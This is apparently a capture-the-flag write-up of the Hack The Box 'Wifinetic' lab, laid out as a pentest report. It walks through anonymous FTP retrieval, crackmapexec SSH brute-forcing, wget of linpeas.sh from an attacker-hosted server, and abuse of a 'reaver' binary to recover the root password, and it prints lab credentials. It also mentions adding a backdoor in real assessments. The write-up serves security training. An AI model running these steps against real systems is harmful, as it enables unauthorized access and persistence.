---
title: "HTB | WIFINETIC"
date: 2024-08-19 00:00:00 +0800
categories: [HTB]
tags: [Linux]                    
---

![img-description](/assets/img/HTB/htb.png)

## Initial Access - Anonymous FTP Access + Credential Brute-forcing

**Vulnerability Explanation:** Anonymous access to the FTP server is allowed on the target machine. The FTP server contains sensitive information such as potential usernames and passwords. Using crackmapexec, access to the 'netadmin' account can be gained through SSH on TCP port 22.

**Vulnerability Fix:** Credentials for user 'netadmin' are compromised and should be changed immediately. Remove sensitive files from the FTP server. Remove anonymous access to the FTP server if not needed. 

**Severity:** Critical

**Steps to reproduce the attack:** Christian found ports 21,22, and 53 open on the target machine. FTP anonymous access is allowed on port 21 and it contains a sensitive set of files that can be exfiltrated and extracted. Using crackmapexec, Christian was able to brute-force login to SSH with the list of potential usernames and password. 

**Port Scan Results**

**TCP:** 21, 22, 53

**UDP:** N/A

Use nmap to scan the target for open ports.

TCP ports 21, 22, 53 were discovered.

```shell
nmap -p- -T5 -vvv -oN nmap.initial 10.10.11.247
```

![img-description](/assets/img/HTB/WIFINETIC/1.png)

FTP anonymous access is allowed on port 21. Get all of the exposed files.

```shell
ftp anonymous@10.10.11.247
```

![img-description](/assets/img/HTB/WIFINETIC/2.png)

```
mget *
```

![img-description](/assets/img/HTB/WIFINETIC/3.png)

Extract the .tar file to the working directory.

![img-description](/assets/img/HTB/WIFINETIC/4.png)

Navigate to the /etc/config directory. A potential password is found in the 'wireless' file.

![img-description](/assets/img/HTB/WIFINETIC/5.png)

Examining the /etc/passwd gives a list of potential usernames. Create a wordlist using the newly found potential credentials.

![img-description](/assets/img/HTB/WIFINETIC/6.png)

![img-description](/assets/img/HTB/WIFINETIC/7.png)

![img-description](/assets/img/HTB/WIFINETIC/8.png)

Use crackmapexec to launch a brute forcing attack against SSH. Valid credentials are found. **netadmin:VeRyUniUqWiFIPasswrd1!**

```shell
crackmapexec ssh 10.10.11.247 -u usernames.txt -p passwords.txt --continue-on-success
```

![img-description](/assets/img/HTB/WIFINETIC/9.png)

Login via SSH with the newly discovered credentials.

```
ssh netadmin@10.10.11.247
```

![img-description](/assets/img/HTB/WIFINETIC/10.png)

We have gained initial access to the target machine as user 'netadmin'.

## Privilege Escalation - Binaries with Capabilities + Vulnerable Interface

**Vulnerability Explanation:** A binary with capabilities, 'reaver', is running on the target machine. This allows us to use it in order to retrieve a potential password. The password can be used to gain root access.

**Vulnerability Fix:** Credentials for 'root' are compromised and should me changed immediately. Remove 'reaver' if not needed. 

**Severity:** Critical

**Steps to reproduce the attack:** Christian enumerated the target machine using linpeas.sh, finding an interesting file with capabilities called 'reaver'. He was able to extract the root password by running the binary and supplying the correct MAC address and interface. 

Navigate to the writeable directory '/tmp'. On Kali, open a python web sever in a directory where you have linpeas.sh. Transfer the file to the target machine. Run the script.

```shell
cd /tmp
```

```shell
python3 -m http.server 8888
```

```shell
wget http://10.10.16.3:8888/linpeas.sh .
```

```shell
chmod +x linpeas.sh
```

```shell
./linpeas.sh > linpeas.output
```

![img-description](/assets/img/HTB/WIFINETIC/11.png)

An interesting file with capabilities, 'reaver', can be found in the linpeas.sh output

![img-description](/assets/img/HTB/WIFINETIC/12.png)

![img-description](/assets/img/HTB/WIFINETIC/13.png)

It is a pentesting tool. By supplying the interface and MAC address, we will be able to see the password. Examine the available interfaces and MAC addressees on the target machine.

```shell
ifconfig
```

![img-description](/assets/img/HTB/WIFINETIC/14.png)

Test the interfaces with the MAC address. Interface 'mon0' returns a valid password for the root user. **root:WhatIsRealaAnDWhAtIsNot51121!**

![img-description](/assets/img/HTB/WIFINETIC/15.png)

Switch user to root.

```
sudo su
```

![img-description](/assets/img/HTB/WIFINETIC/16.png)

We now have root access to the target machine.

## Post Exploitation

Since this is a CTF the objective is only to retrieve the flag located in the /root directory as a privileged user. 

In a real world assessment, we would attempt to add a back door for continuous access to the machine.